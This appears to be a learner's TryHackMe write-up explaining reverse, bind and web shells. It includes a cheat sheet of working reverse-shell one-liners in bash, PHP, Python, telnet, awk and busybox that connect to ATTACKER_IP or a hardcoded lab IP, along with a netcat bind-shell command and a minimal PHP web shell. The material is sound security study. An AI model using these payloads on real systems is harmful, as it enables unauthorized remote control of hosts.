## Task 1: Room Introduction

### What is a Shell?

A **shell** gives a user or attacker command-line access to a system.
 
```
Attacker
   │
   │ Remote Shell
   ▼
Target Machine
   │
   └── Execute Commands
```

In offensive security, shells are commonly used after gaining access to interact with the target remotely.

### What you'll learn

| Topic             | Purpose                                           |
| ----------------- | ------------------------------------------------- |
| **Shell basics**  | Understand shells in offensive security           |
| **Reverse Shell** | Target connects **back to attacker**              |
| **Bind Shell**    | Attacker connects **to target**                   |
| **Web Shell**     | Execute commands through a web application/server |

### Easy comparison

```
REVERSE SHELL
Target ─────────► Attacker
       connects back


BIND SHELL
Attacker ───────► Target
         connects in


WEB SHELL
Attacker ──HTTP──► Web Server
                   │
                   ▼
              Execute command
```

## Task 2: Shell Overview

### What is a Shell?

A **shell** is software that lets you interact with an operating system, usually by entering commands.

```
User / Attacker
      │
      │ Commands
      ▼
    Shell
      │
      ▼
Operating System
```

Examples include **Bash**, **Zsh**, **PowerShell**, and **CMD**.

### In Cybersecurity

After gaining shell access to a lab/authorized target, it can provide command execution on that system.

| Activity                 | Simple meaning                                                   |
| ------------------------ | ---------------------------------------------------------------- |
| **Remote Control**       | Run commands remotely                                            |
| **Privilege Escalation** | Try to gain higher permissions                                   |
| **Data Access**          | Read accessible files/data                                       |
| **Persistence**          | Maintain authorized lab access for later testing                 |
| **Post-Exploitation**    | Assess what is possible after initial access                     |
| **Pivoting**             | Use one compromised lab machine to reach another network segment |

### Easy flow

```
Initial Access
     │
     ▼
   Shell
     │
     ├──► Run Commands
     ├──► Explore System
     ├──► Check Privileges
     ├──► Access Files
     └──► Explore Network
```

### Remember

**Shell = an interface for interacting with the operating system and executing commands.**

In offensive-security labs:

```
Get Shell
   ↓
Interact with Target
   ↓
Run Commands
   ↓
Continue Authorized Testing
```

## Task 3: Reverse Shell

### What is a Reverse Shell?

A **reverse shell** is when the **target connects back to the attacker**, giving the attacker a remote command shell.

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/566b0a96-516b-4d7b-8ef5-d937d263f0af" />


**Easy memory:** Reverse = **Target → Attacker**

### Netcat Listener

On the attacker machine, Netcat waits for the connection:

```
nc -lvnp 443
```

| Option   | Meaning                  |
| -------- | ------------------------ |
| `-l`     | Listen for connection    |
| `-v`     | Verbose output           |
| `-n`     | Don't perform DNS lookup |
| `-p 443` | Listen on port `443`     |

we might see:

```
listening on [any] 443 ...
```

This means the attacker is **waiting**, not connected yet.

### Target Connects Back

In the authorized lab, a reverse-shell payload is executed on the target. Its purpose is essentially:

```
Target shell
     │
     │ Connect to
     ▼
ATTACKER_IP:443
     │
     ▼
Netcat Listener
```

The room's pipe example uses a named pipe (`/tmp/f`) to connect shell input/output to Netcat. The important concept is **bidirectional communication**:

```
Attacker command
      │
      ▼
   Network
      │
      ▼
Target shell
      │
      ▼
Command output
      │
      └────────────► Attacker
```

### Successful Connection

The attacker terminal may change from:

```
listening on [any] 443 ...
```

to something like:

```
connect to [...] from [...] 59964

target@tryhackme:~$
```

Now the shell has connected successfully.

### Most important

```
REVERSE SHELL

1. Attacker starts listener
           ↓
      nc -lvnp PORT

2. Target connects back
           ↓
   Target ───────► Attacker

3. Attacker receives shell
           ↓
      Run commands
```

**Reverse shell = attacker listens, target connects back.**

## Task 4: Bind Shell

A **bind shell** works in the opposite direction from a reverse shell.

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/ea617442-555e-4faa-8414-b766630e0617" />


**Easy memory:** Bind shell = **Target listens → Attacker connects**

### How to do it in your TryHackMe lab

#### 1. On the Target / Lab Machine

The room uses:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

It creates a shell and makes Netcat listen on:

```
0.0.0.0:8080
```

Meaning:

```
0.0.0.0 → listen on all network interfaces
8080    → listening port
```

After running it, the terminal may appear to **do nothing**. That's normal—it is waiting for a connection.

#### 2. Find the Target IP

On the lab machine, if needed:

```
ip addr
```

For example, the screenshot uses:

```
10.49.178.59
```

Connect to the bind shell:

```
nc -nv TARGET_IP 8080
```

#### 3. Test Bind Shell

##### On target:

### Reverse vs Bind

| Reverse Shell       | Bind Shell              |
| ------------------- | ----------------------- |
| Attacker listens    | **Target listens**      |
| Target connects     | **Attacker connects**   |
| `Target → Attacker` | **`Attacker → Target`** |

So remember:

```
Reverse = Target calls me
Bind    = I call Target
```

Use these commands only in the TryHackMe lab or another system you're authorized to test.

## Task 6: Shell Payloads


### BASH REVERSE SHELLS
#### 1. Normal Bash Reverse Shell
````
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
````

- ``bash -i``: Starts an interactive bash shell
- ``>&``: Redirects both standard output (stdout) and standard error (stderr)
- ``/dev/tcp/ATTACKER_IP/443``: Special bash device that creates a TCP connection to the attacker's IP on port 443
- ``0>&1``: Redirects standard input (stdin) to come from the same place as standard output (the TCP connection)

**How it works**: Creates an interactive shell where all input comes from the network connection and all output (including errors) goes back through the same connection.


#### 2. Bash Read Line Reverse Shell
````
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
````

- ``exec 5<>/dev/tcp/ATTACKER_IP/443``: Creates file descriptor 5 and opens it for both reading and writing to the TCP connection
- ``cat <&5``: Reads from file descriptor 5 (the network connection)
- ``| while read line``: Pipes each line to a while loop that reads commands
- ``do $line``: Executes the command that was read
- ``2>&5 >&5``: Redirects both stderr and stdout back to file descriptor 5 (the network)

**How it works**: Continuously reads commands from the network, executes them one by one, and sends results back. This is more manual and allows for command-by-command processing.


#### 3. Bash With File Descriptor 196 Reverse Shell
````
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
````

- ``0<&196``: Duplicates file descriptor 196 to stdin (file descriptor 0)
- ``exec 196<>/dev/tcp/ATTACKER_IP/443``: Opens file descriptor 196 for read/write to the TCP connection
- ``sh``: Starts a new shell
- ``<&196``: Reads input from file descriptor 196
- ``>&196``: Sends stdout to file descriptor 196
- ``2>&196``: Sends stderr to file descriptor 196

**How it works**: Uses a non-standard file descriptor (196) to avoid conflicts with standard descriptors, then launches a shell that communicates entirely through this network connection.


#### 4. Bash With File Descriptor 5 Reverse Shell
````
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
````

- ``bash -i``: Interactive bash shell
- 5<> /dev/tcp/ATTACKER_IP/443``: Opens file descriptor 5 for the TCP connection
- ``0<&5``: Redirects stdin from file descriptor 5
- ``1>&5``: Redirects stdout to file descriptor 5
- ``2>&5``: Redirects stderr to file descriptor 5

**How it works**: Similar to the first example but explicitly uses file descriptor 5 for all communication channels, making the redirection more explicit and controlled.

### PHP REVERSE SHELLS

#### 1. PHP exec() Function
````
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
````

- ``php -r``: Executes PHP code directly from command line
- ``$sock=fsockopen("ATTACKER_IP",443)``: Creates a TCP socket connection to the attacker
- ``exec()``: PHP function that executes external programs
- ``sh <&3 >&3 2>&3``: Launches a shell and redirects all I/O through file descriptor 3 (the socket)

**How it works**: The fsockopen() creates the network connection, and exec() launches a shell that communicates through that connection. File descriptor 3 is automatically created for the socket.

#### 2. PHP shell_exec() Function
````
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
````

- Similar to exec() but uses ``shell_exec()`` instead
- ``shell_exec()``: Executes command and returns output as a string
- The same redirection technique is used

**How it works**: ``shell_exec()`` is often preferred when you need to capture the command output, but here it's used similarly to exec() for a reverse shell.

#### 3. PHP system() Function
````
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
````

- ``system()``: PHP function that executes command and outputs result directly
- Similar socket and redirection setup

**How it works**: ``system()`` is useful because it automatically sends command output to the output buffer, making it simpler for web-based attacks where output needs to be displayed.

#### 4. PHP passthru() Function
````
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
````

- ``passthru()``: Similar to system() but specifically for binary data
Doesn't convert output, preserves raw data

**How it works**: Best for binary data transfer or when you need raw output without any PHP processing or conversion.

#### 5. PHP popen() Function
````
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
````

- ``popen()``: Opens a process file pointer
- Second parameter "r" indicates read mode
- Allows bi-directional communication with the process

**How it works**: Creates a pipe to the shell process, allowing two-way communication. Useful when you need more control over process interaction.

### PYTHON REVERSE SHELLS
#### 1. Python Export Environment Variables
````
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
````
Explanation:
- ``export RHOST="ATTACKER_IP"``: Sets remote host as environment variable
- ``export RPORT=443``: Sets remote port as environment variable
- ``python -c``: Executes Python code
- ``import sys,socket,os,pty``: Imports necessary modules
- ``s=socket.socket()``: Creates a new socket
- ``s.connect()``: Connects to attacker using environment variables
- ``os.dup2(s.fileno(),fd)``: Duplicates socket file descriptor to stdin(0), stdout(1), stderr(2)
- ``pty.spawn("bash")``: Spawns an interactive bash shell

**How it works**: Uses environment variables for flexibility, creates a socket, redirects all standard I/O through the socket, and spawns an interactive shell.

#### 2. Python subprocess Module
````
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
````

- ``socket.AF_INET,socket.SOCK_STREAM``: Explicitly specifies IPv4 and TCP
- Connects to hardcoded IP (``10.4.99.209``) and port 443
- Same redirection technique
- Uses subprocess module implicitly through pty

Ho**w it works**: Similar to the previous one but with explicit socket parameters and hardcoded connection details. More traditional Python reverse shell.

#### 3. Short Python Reverse Shell
````
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
````
Explanation:
- Compact version combining imports
- List comprehension for file descriptor duplication
- Minimal, clean implementation

How it works: The most concise Python reverse shell. Creates socket, connects, redirects all I/O, and spawns a shell. Perfect for tight spaces.

### OTHER REVERSE SHELLS


#### 1. Telnet Reverse Shell
````
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
````
- ``TF=$(mktemp -u)``: Creates a unique temporary filename
- ``mkfifo $TF``: Creates a named pipe (FIFO) with that name
- ``&&``: Only proceeds if mkfifo succeeds
- ``telnet ATTACKER_IP 443``: Connects via telnet
- ``0<$TF``: Redirects stdin from the named pipe
- ``| sh``: Pipes output to the shell
- ``1>$TF``: Redirects stdout to the named pipe

**How it works**: Creates a bidirectional communication channel using a named pipe. Telnet connects to the attacker, the shell reads from and writes to the pipe, creating a two-way communication pathway.

#### 2. AWK Reverse Shell
````
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
````
- ``BEGIN``: Runs the block before processing any input
- ``s = "/inet/tcp/0/ATTACKER_IP/443"``: Creates a TCP network connection
- ``while(42)``: Infinite loop (42 is just a non-zero number)
- ``printf "shell>" |& s``: Sends prompt to socket
- ``s |& getline c``: Reads command from socket
- ``if(c)``: If command exists
- ``while ((c |& getline) > 0)``: Executes command and reads output
- ``print $0 |& s``: Sends output back through socket
- ``close(c)``: Closes command execution
- ``close(s)``: Closes socket when "exit" is received

**How it works**: Uses AWK's built-in TCP networking capabilities. It creates a persistent connection, sends a prompt, reads commands, executes them, and returns results. Extremely versatile but complex.

#### 3. BusyBox Reverse Shell
````
busybox nc ATTACKER_IP 443 -e sh
````

- ``busybox``: Multi-call binary that provides many Unix utilities
- ``nc``: Netcat command from busybox
- ``ATTACKER_IP 443``: Target IP and port
- ``-e sh``: Execute the shell program after connection

**How it works**: The simplest of all reverse shells. BusyBox's netcat implementation supports the -e flag, which executes a program and connects its stdin/stdout to the network socket. This creates an instant, no-fuss reverse shell.

> **Note**: The ``-e`` option is often disabled in modern netcat for security reasons, but BusyBox versions often retain it for embedded systems.

## Task 6: Web Shell
A **web shell** is a server-side script placed on a web server that provides an interface for executing commands through the web application.

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/b6e73a65-c71b-441e-ac1e-ed82e450dded" />

Common vulnerability that can make attacker input shell:
| Vulnerability                                   | What it means                                                            | How it relates to a Web Shell                                             |
| ----------------------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| **Unrestricted File Upload**                    | The application accepts dangerous file types without proper validation.  | Could allow a server-side script such as `shell.php` to be uploaded.      |
| **File Inclusion (LFI/RFI)**                    | The application improperly loads files based on user-controlled input.   | Could cause unintended server-side files/code to be included or executed. |
| **Command Injection**                           | User-controlled input reaches an OS command without proper sanitization. | Could provide operating-system command execution directly.                |
| **Broken Access Control / Unauthorized Access** | A user gains access to functionality or files they should not control.   | Could allow modification or placement of files on the web server.         |



### Example PHP Web Shell
````
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
````
| Code           | Explanation                                                             |
| -------------- | ----------------------------------------------------------------------- |
| `<?php`        | Starts PHP code.                                                        |
| `isset(...)`   | Checks whether a parameter was supplied.                                |
| `$_GET['cmd']` | Reads the value of the `cmd` URL parameter.                             |
| `system(...)`  | Passes the supplied string to the operating system command interpreter. |
| `}`            | Ends the `if` block.                                                    |
| `?>`           | Ends PHP code.                                                          |

````

     │
     ▼
Command Output
     │
     ▼
Web Browser
````


### Web Shell vs Reverse Shell
| Feature           | Web Shell                | Reverse Shell                  |
| ----------------- | ------------------------ | ------------------------------ |
| Connection        | Attacker → Web server    | Target → Attacker              |
| Common protocol   | HTTP / HTTPS             | TCP                            |
| Interface         | Browser / HTTP client    | Terminal/listener              |
| Example location  | `shell.php`              | Shell process on target        |
| Command transport | HTTP parameters/requests | Network socket                 |
| Interaction       | Often request → response | Usually interactive session    |
| Requires listener | Usually no               | Yes                            |
| Typical language  | PHP, ASP/ASPX, JSP       | Bash, Python, PowerShell, etc. |


### Common Web-Shell Languages
| Web Server Technology | Typical Extension |
| --------------------- | ----------------- |
| PHP                   | `.php`            |
| ASP.NET               | `.aspx`           |
| Classic ASP           | `.asp`            |
| Java/JSP              | `.jsp`            |
| CGI scripts           | `.cgi`            |

## Task 9: Conclusion

| Shell Type        | How it works                                                        | Connection Direction  |
| ----------------- | ------------------------------------------------------------------- | --------------------- |
| **Reverse Shell** | Target connects back to the attacker                                | Target → Attacker     |
| **Bind Shell**    | Target opens/listens on a port; attacker connects to it             | Attacker → Target     |
| **Web Shell**     | Commands are executed through a malicious/server-side web interface | Attacker → Web Server |


Flow:
````
REVERSE SHELL
Target ───────────────► Attacker
        Connect back


BIND SHELL
Attacker ─────────────► Target
         Connect to
         listening port


WEB SHELL
Attacker ──HTTP───────► Web Server
                        │
                        ▼
                   Execute command
                        │
                        ▼
                   Return output
````
